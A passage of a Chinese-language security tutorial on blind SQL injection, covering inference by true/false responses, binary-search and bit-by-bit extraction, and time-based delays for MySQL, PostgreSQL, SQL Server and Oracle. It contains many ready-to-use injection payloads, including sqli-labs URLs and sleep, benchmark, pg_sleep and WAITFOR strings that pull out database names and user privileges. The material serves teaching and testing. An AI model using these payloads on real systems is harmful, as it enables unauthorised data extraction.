class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以看到，在其中注入了子查询，当然我们可以换成其他的漏洞代码</p><p><img src="https://images.dadream.eu.org/images/2024/07/1635b29c12fca4d4f03c3fa7f6557976.png"></p><h4 id="常见的SQL盲注场景"><a href="#常见的SQL盲注场景" class="headerlink" title="常见的SQL盲注场景"></a>常见的SQL盲注场景</h4><p>1） 提交一个导致SQL查询无效的漏洞时会返回一个通用的错误页面，而提交正确的SQL时则会返回一个内容可被适度控制的页面。这种情况通常出现在根据用户选择来显示信息的页面中。例如，用户点击一个包含id参数（能唯一识别数据库中的商品）的链接或者提交一个搜索请求。对于这两种情况，用户可控制页面提供的输出，因为该页面是根据用户提供的信息来生成的，比如提供一个产品的id，该页面还包含了从响应中获得的数据。</p><p>因为页面提供了反馈信息（虽然不是以详细的数据库错误消息方式），所以可以使用基于时间的确认漏洞以及能够修改页面显示数据集的漏洞。例如，某个攻击可能会显示香皂或刷子的产品描述，以指示是否提取到了 0-bit或1-bit的数据。大多数情况下，只需提交一个单引号就足以破坏SQL查询平衡并强制产生一个通用的错误页面，这将有助于推断是否存在SQL注入漏洞。</p><p>2） 提交一个导致SQL查询无效的漏洞时会返回一个通用的错误页面，而提交正确的SQL时则会返回一个内容不可控的页面。当页面包含多个SQL查询，但只有第一个查询容易受到攻击且不产生输出时会碰到这种情况。还有一种场景也会引发这种情况：SQL注入位于 UPDATE或INSERT语句中，此时提交的信息虽然被写入数据库中且不产生输出，但却会产生通用的错误。</p><p>使用单引号产生的通用错误页面可能会暴露这种页面（与基于时间的漏洞相同），但基于内容的攻击却不会。</p><p>3） 提交受损或不正确的SQL既不会产生错误页面，也不会以任何方式影响页面输出。因 为这种类型的SQL盲注场景不返回错误，而基于时间的漏洞或产生带外副作用的漏洞则最有可能成功识别易受攻击的参数。</p><h4 id="SQL盲注技术"><a href="#SQL盲注技术" class="headerlink" title="SQL盲注技术"></a>SQL盲注技术</h4><h5 id="推断攻击技术"><a href="#推断攻击技术" class="headerlink" title="推断攻击技术"></a>推断攻击技术</h5><p>当请求的位为1时，响应会有专门的标志；而当请求的位为0时，则会产生不同的响应。响应中的真正差异取决于所选用的推断工具，所使用的方法则大多基于响应时间、页面内容、页面错误或以上这些因素的组合。</p><p>条件分支IF语句，攻击者能通过响应的不同推断出是哪个分支</p><p>sqli-labs示例</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//sql/Less-8/?id=1</span><span class="token comment">#you are in</span>http:<span class="token comment">//sql/Less-8/?id=1' and '1'='1</span><span class="token comment">#you are in</span>http:<span class="token comment">//sql/Less-8/?id=1' and '1'='2</span><span class="token comment">#</span>http:<span class="token comment">//sql/Less-8/?id=1' or '1'='1</span><span class="token comment">#you are in</span><span class="token comment">#可以看到有两种状态，空白和you are in</span>http:<span class="token comment">//sql/Less-8/?id=1' and (ascii(substr((select database()),1,1)))=115 %23</span><span class="token comment">#you are in</span>可以判断数据库第一个字符是shttp:<span class="token comment">//sql/Less-8/?id=1' and (ascii(substr((select database()),2,1)))=101 %23</span><span class="token comment">#you are in</span>经过多次注入就能将数据全部检索出来http:<span class="token comment">//sql/Less-8/?id=1' and (length(database()))=8 %23</span><span class="token comment">#you are in</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="增加推断攻击技术的复杂性"><a href="#增加推断攻击技术的复杂性" class="headerlink" title="增加推断攻击技术的复杂性"></a>增加推断攻击技术的复杂性</h5><ul><li><p>二分搜素方法（分半算法）</p><p>两种状态，添加第三种状态可以将最佳请求次数降为1，也可以自己创建字母表</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Incubating<span class="token string">' AND ASCII(SUBSTRING (SYSTEM USER, 1, 1)) &gt;127-- (False)Incubating'</span> <span class="token operator">AND</span> ASCII<span class="token punctuation">(</span>SUBSTRING <span class="token punctuation">(</span>SYSTEM <span class="token keyword">USER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">63</span><span class="token comment">-- (True)</span>Incubating<span class="token string">' AND ASCII(SUBSTRING (SYSTEM USER, 1, 1) )&gt;95-- (True)Incubating'</span> <span class="token operator">AND</span> ASCII<span class="token punctuation">(</span>SUBSTRING <span class="token punctuation">(</span>SYSTEM <span class="token keyword">USER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span><span class="token number">111</span><span class="token comment">-- (True)</span>Incubating<span class="token string">' AND ASCII(SUBSTRING (SYSTEM USER,1,1)) &gt;119-- (False)Incubating'</span> <span class="token operator">AND</span> ASCII<span class="token punctuation">(</span>SUBSTRING <span class="token punctuation">(</span>SYSTEM <span class="token keyword">USER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span><span class="token number">115</span><span class="token comment">-- (False)</span>Incubating<span class="token string">' AND ASCII(SUBSTRING (SYSTEM USER,1,1)) &gt;113-- (True)Incubating'</span> <span class="token operator">AND</span> ASCII<span class="token punctuation">(</span>SUBSTRING <span class="token punctuation">(</span>SYSTEM <span class="token keyword">USER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span><span class="token number">114</span><span class="token comment">-- (True)</span><span class="token comment">-- 自建字母表，优化二分法</span>Incubating<span class="token string">' and SUBSTRING ('</span>c4ca4238a0b923820dcc509a6f75849b<span class="token string">',1,1) in('</span><span class="token number">0</span><span class="token string">','</span><span class="token number">1</span><span class="token string">','</span><span class="token number">2</span><span class="token string">','</span><span class="token number">3</span><span class="token string">','</span><span class="token number">4</span><span class="token string">','</span><span class="token number">5</span><span class="token string">','</span><span class="token number">6</span><span class="token string">','</span><span class="token number">7</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>逐位方法</p><p><img src="https://images.dadream.eu.org/images/2024/07/304ab8debee5bb56e02a5703f7ad7fba.png"></p><p>对每位（bit）进行比对</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Incubating<span class="token string">'AND ASCII (SUBSTRING (SYSTEM USER, 1, 1)) &amp;128-128-- (False)Incubating'</span><span class="token operator">AND</span> ASCII <span class="token punctuation">(</span>SUBSTRING <span class="token punctuation">(</span>SYSTEM <span class="token keyword">USER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">64</span><span class="token operator">=</span><span class="token number">64</span><span class="token comment">-- (True)</span>Incubating<span class="token string">'AND ASCII (SUBSTRING (SYSTEM USER, 1,1)) &amp;32=32-- (True)Incubating'</span><span class="token operator">AND</span> ASCII <span class="token punctuation">(</span>SUBSTRING <span class="token punctuation">(</span>SYSTEM <span class="token keyword">USER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span> <span class="token number">16</span><span class="token operator">=</span><span class="token number">16</span><span class="token comment">-- (True)</span>Incubating<span class="token string">' AND ASCII (SUBSTRING (SYSTEM USER, 1, 1)) &amp; 8=8-- (False)Incubating'</span> <span class="token operator">AND</span> ASCII <span class="token punctuation">(</span>SUBSTRING <span class="token punctuation">(</span>SYSTEM <span class="token keyword">USER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">4</span><span class="token operator">=</span><span class="token number">4</span><span class="token comment">-- (False)</span>Incubating<span class="token string">'AND ASCII (SUBSTRING (SYSTEM USER, 1,1))&amp; 2=2-- (True)Incubating'</span><span class="token operator">AND</span> ASCII <span class="token punctuation">(</span>SUBSTRING <span class="token punctuation">(</span>SYSTEM <span class="token keyword">USER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">-- (True)</span><span class="token comment">-- ture代表1，false代表0，比对出得到01110011，十进制115，字母s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h5 id="非主流通道技术"><a href="#非主流通道技术" class="headerlink" title="非主流通道技术"></a>非主流通道技术</h5><p>用的传输通道而非页面响应，它的传输通道包括DNS、e-mail和HTTP请求。非主流通道技术更重要的特点是：它们通常支持一次检索多块数据，而不是推断单个位或单个字节的值。</p><h3 id="使用基于时间技术"><a href="#使用基于时间技术" class="headerlink" title="使用基于时间技术"></a>使用基于时间技术</h3><p>发出请求到响应到达这段时间的差异。当某一状态为真时，如果能够让响应暂停几秒钟， 而当状态为假时，能够不出现暂停</p><h4 id="延迟数据库查询"><a href="#延迟数据库查询" class="headerlink" title="延迟数据库查询"></a>延迟数据库查询</h4><h5 id="Mysql延迟"><a href="#Mysql延迟" class="headerlink" title="Mysql延迟"></a>Mysql延迟</h5><p> 两个函数，sleep()，benchmark(n,expression)</p><p>sleep(N)强制延迟N秒</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">xxx<span class="token punctuation">.</span>php?canshu<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select if(substring(user(),1,4)='</span>root'<span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>benchmark(N,expression)执行表达式expression N次，通常表达式为一个函数，这样能增加执行时间</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">xxx<span class="token punctuation">.</span>php?canshu<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select if(substring(user(),1,4)='</span>root'<span class="token punctuation">,</span>benchmark<span class="token punctuation">(</span><span class="token number">100000000</span><span class="token punctuation">,</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通常<code>'root'</code>写成16进制0x726f6f74（只编码了root），只用可以去掉单引号</p><ul><li><p>二分法</p><p>依然是两种状态，延迟和未延迟</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">' <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token keyword">IF</span> <span class="token punctuation">(</span>ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token punctuation">(</span>……<span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>k<span class="token punctuation">,</span>SLEEP<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">' <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token keyword">IF</span> <span class="token punctuation">(</span>ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token punctuation">(</span>……<span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>k<span class="token punctuation">,</span>benchmark<span class="token punctuation">(</span><span class="token number">100000000</span><span class="token punctuation">,</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>k是二分中间值</p></li><li><p>逐位</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">' UNION SELECT IF (ASCII (SUBSTRING ((……), i, 1))&amp;2^j =2^j,SLEEP(1), 1) # '</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token keyword">IF</span> <span class="token punctuation">(</span>ASCII <span class="token punctuation">(</span>SUBSTRING <span class="token punctuation">(</span><span class="token punctuation">(</span>……<span class="token punctuation">)</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">^</span>j <span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token punctuation">,</span>BENCHMARK<span class="token punctuation">(</span><span class="token number">100000000</span><span class="token punctuation">,</span> RAND<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><p>一部分注入在where字句中，这时延迟会在匹配表中每一行都会执行一次，时间会很长</p><h5 id="PostgreSQL延迟技术"><a href="#PostgreSQL延迟技术" class="headerlink" title="PostgreSQL延迟技术"></a>PostgreSQL延迟技术</h5><p>8.1或者更低的版本，使用系统库的sleep()函数创建一个函数</p><p>8.2及更高的版本，不是用sleep，提供了一个函数<code>pg_sleep()</code>，默认安装，返回值是void，不能直接放在where子句中</p><p>解决方法，PostgreSQL能使用堆叠查询，第二个查询返回void，将由当前正在执行的应用程序进行处理，这会导致一个错误，当前程序将会失败，添加第三个哑查询，返回正确数量的列。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span><span class="token punctuation">;</span> <span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token number">1</span> <span class="token keyword">WHEN</span> <span class="token number">1</span> <span class="token keyword">THEN</span> pg_sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">END</span><span class="token punctuation">;</span> <span class="token keyword">SELECT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>另一种解决方法，如果拥有创建PL/pgSQL函数的权限，可以创建一个新函数来封装pg_sleep()，并使它的返回值不为void，这样就能替代pg_sleep()，数据库拥有者必须为每个数据库单独启用PL/pgSQL语言。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">LANGUAGE</span> <span class="token string">'plpgsql'</span><span class="token punctuation">;</span> <span class="token comment">-- 启用PL/pgSQL</span><span class="token comment">-- 定义一个封装函数pause()</span><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">FUNCTION</span> pause<span class="token punctuation">(</span><span class="token keyword">integer</span><span class="token punctuation">)</span> <span class="token keyword">RETURNS</span> <span class="token keyword">integer</span> <span class="token keyword">AS</span> $$<span class="token keyword">DECLARE</span>wait alias <span class="token keyword">for</span> $<span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">BEGIN</span>PERFORM pg_sleep<span class="token punctuation">(</span>wait<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">RETURN</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span>$$ <span class="token keyword">LANGUAGE</span> <span class="token string">'plpgsql'</span> STRICT<span class="token punctuation">;</span><span class="token comment">-- 调用</span>xxx<span class="token punctuation">.</span>php?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> usename <span class="token keyword">FROM</span> pg_user <span class="token keyword">WHERE</span> usesuper <span class="token operator">IS</span> <span class="token boolean">TRUE</span> <span class="token operator">and</span> <span class="token keyword">current_user</span><span class="token operator">=</span>usename<span class="token punctuation">)</span> <span class="token keyword">WHEN</span> <span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">)</span> <span class="token keyword">THEN</span> PAUSE<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token keyword">ELSE</span> <span class="token number">1</span> <span class="token keyword">END</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>二分法</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">';SELECT CASE WHEN (ASCII (SUBSTR (..., i,1)) &gt; k) THEN pg_sleep(1) END; SELECT NULL,...,NULL;-- '</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> <span class="token punctuation">(</span>ASCII<span class="token punctuation">(</span>SUBSTR<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> k<span class="token punctuation">)</span> <span class="token keyword">THEN</span> PAUSE <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">ELSE</span> <span class="token number">1</span> <span class="token keyword">END</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>逐位</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">';SELECT CASE WHEN (ASCII (SUBSTR (...,i,1)) &amp;2^j=2^j) THEN pg_sleep(1) END; SELECT NULL,...,NULL;'</span><span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> <span class="token punctuation">(</span>ASCII <span class="token punctuation">(</span>SUBSTR<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token punctuation">)</span> <span class="token keyword">THEN</span> PAUSE <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">ELSE</span> <span class="token number">1</span> <span class="token keyword">END</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><h5 id="SQL-Server延迟"><a href="#SQL-Server延迟" class="headerlink" title="SQL Server延迟"></a>SQL Server延迟</h5><p><code>waitfor delay '00:01:00'</code>将正常执行时间增加1分钟，waitfor delay不能在where子句中使用，能使用堆叠查询</p><p>SQL server驱动程序会把第一个查询输出返回给正在执行处理的程序，分号前面的会返回给后面的语句</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span><span class="token punctuation">;</span> <span class="token keyword">IF</span> <span class="token keyword">SYSTEM_USER</span><span class="token operator">=</span><span class="token string">'sa'</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'00:00:05'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果用户名为sa，返回时间就大于5秒</p><p>还有一种新技术，该技术使用两个通过逻辑“与”隔开的子查询，其中一个子查询的执行时间为很多秒，另一个子查询包含一个推断检查。如果检查失败(第x位为0)，第二个子查询将返回，第一个子查询则因受“与”子句的影响而提前中止。实际结果是，如果正在推断的位为1，那么请求将花费比位为0时更多的时间。（其他数据库通用）<a href="https://archive.codeplex.com/?p=marathontool">Marathon Tool - CodePlex Archive</a></p><ul><li><p>二分法</p></li><li><pre><code class="sql">;IF ASCII(SUBSTRING((...),i,1))&gt;k WAITFOR DELAY '00:00:05';-- <pre class="line-numbers language-none"><code class="language-none">- 逐位  ```sql  ;IF ASCII (SUBSTRING ((...),i,1))&amp;2^j=2^j WAITFOR DELAY '00:00:05';--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></code></pre></li></ul><h5 id="Oracle延迟"><a href="#Oracle延迟" class="headerlink" title="Oracle延迟"></a>Oracle延迟</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">BEGIN</span> DBMS_LOCK<span class="token punctuation">.</span>SLEEP<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">END</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>oralce中许多SQL注入都指向DBMS_LOCK包，并且这个包必须在管理员下使用，同时oracle不支持堆叠查询，所以sleep(n)在SQL语句中不好利用</p><p>如果注入点位于PL/SQL块中，则能利用</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">IF</span> <span class="token punctuation">(</span>BITAND<span class="token punctuation">(</span>ASCII<span class="token punctuation">(</span>SUBSTR<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token punctuation">)</span> <span class="token keyword">THEN</span> DBMS_LOCK<span class="token punctuation">.</span>SLEEP<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">END</span> <span class="token keyword">IF</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用DBMS_PIPE.RECEIVE_MESSAGE函数可以实现基于时间的 攻击</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">xxx<span class="token punctuation">.</span>aspx?test<span class="token operator">=</span>test<span class="token string">'OR 1 = CASE WHENSYS_CONTEXT('</span>USERENV<span class="token string">', '</span>ISDBA<span class="token string">') = '</span><span class="token boolean">TRUE</span><span class="token string">' THEN DBMS_PIPE.RECEIVE_ MESSAGE('</span>foo'<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token keyword">ELSE</span> <span class="token number">1</span> <span class="token keyword">END</span> <span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="基于时间的推断应考虑的问题"><a href="#基于时间的推断应考虑的问题" class="headerlink" title="基于时间的推断应考虑的问题"></a>基于时间的推断应考虑的问题</h4><p>如果请求延迟很久，也可能是过载过高或者信道拥堵</p><p>解决方法</p><ol><li>将延迟尽量设置高些以抵消其他延迟</li><li>发送两个几乎相同的请求，比较两个延迟，一个可能是状态为0的延迟，一个是状态为1的延迟，加以推断</li></ol><h3 id="使用基于响应的请求"><a href="#使用基于响应的请求" class="headerlink" title="使用基于响应的请求"></a>使用基于响应的请求</h3><p>推断状态时，可以借助响应中包含的文本或在检查特定值时强制产生的错误。</p><h4 id="Mysql响应技术"><a href="#Mysql响应技术" class="headerlink" title="Mysql响应技术"></a>Mysql响应技术</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span><span class="token comment">#返回两条结果</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span> <span class="token operator">AND</span> ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">^</span>J<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>J<span class="token comment">#</span><span class="token comment">#如果i位为1，条件为真，返回上面相同结果，i位为0则返回0条</span><span class="token comment">#平衡拆分技术</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> id<span class="token operator">=</span> <span class="token number">1</span><span class="token comment">#逐位方法(bit-by-bit)的拆分与平衡注入字符串为：</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">+</span><span class="token keyword">if</span><span class="token punctuation">(</span>ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token keyword">CURRENT_USER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#无法修改</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token keyword">IF</span><span class="token punctuation">(</span>ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token keyword">CURRENT_USER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">WHERE</span> table_name <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#很明显，第二个子查询返回多行，这句SQL会报错，那么就会有两种状态</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用以PHP编写并以MySQL作为数据存储的应用时，在数据库查询执行过程中出现的错误不会产生引发通用错误页面的异常。调用页面必须检查mysql_query()是否返回FALSE,或者mysql_error()是否返回一个非空字符串。只要有一个条件成立，页面就会打印一个应用专用的错误消息。这样做的结果是，MySQL错误不会产生HTTP 500响应代码，而是 产生正常的200响应代码。</p><h4 id="PostgreSQL响应技术"><a href="#PostgreSQL响应技术" class="headerlink" title="PostgreSQL响应技术"></a>PostgreSQL响应技术</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token function">COUNT</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token 